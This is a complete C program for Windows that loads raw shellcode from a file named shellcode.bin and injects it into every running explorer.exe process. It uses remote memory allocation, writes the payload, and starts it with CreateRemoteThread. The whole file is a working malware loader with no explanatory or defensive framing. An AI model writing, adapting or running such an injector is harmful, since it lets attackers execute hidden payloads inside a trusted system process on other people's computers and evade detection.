#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int InjectIntoProcess(DWORD pid, unsigned char* buf, size_t size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return 0;

    LPVOID addr = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!addr) {
        CloseHandle(hProc);
        return 0;
    }

    WriteProcessMemory(hProc, addr, buf, size, NULL);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (!hThread) {
        CloseHandle(hProc);
        return 0;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return 1;
}

int main() {
    FILE* f = fopen("shellcode.bin", "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* buf = (unsigned char*)malloc(size);
    fread(buf, 1, size, f);
    fclose(f);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 2;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    int injected = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                if (InjectIntoProcess(pe.th32ProcessID, buf, size)) {
                    injected++;
                }
            }
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    free(buf);

    return (injected > 0) ? 0 : 3;
}
